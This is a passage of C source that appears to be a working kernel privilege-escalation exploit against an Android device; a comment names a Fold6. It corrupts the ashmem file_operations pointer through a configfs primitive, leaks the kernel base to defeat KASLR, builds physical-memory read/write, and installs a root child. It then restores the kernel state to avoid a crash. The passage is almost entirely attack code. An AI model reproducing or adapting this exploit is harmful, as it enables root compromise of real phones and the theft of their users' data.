    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  pr_info("cfi fops_before ret=%zd value=%016llx want=%016zx errno=%d\n",
          rb, (unsigned long long)before, fake_fops, errno);
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!init_runtime_physmap(fd)) {
    cfi_last_step = 12;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  /* Keep the original completion path.  The UMH helper has already detached;
   * introducing a post-handshake fork/keeper here changes the route-worker
   * timing and was observed to reboot the Fold6 immediately after the hold
   * log. */
  reset_pipe_attempt();
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  reset_pipe_attempt();
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
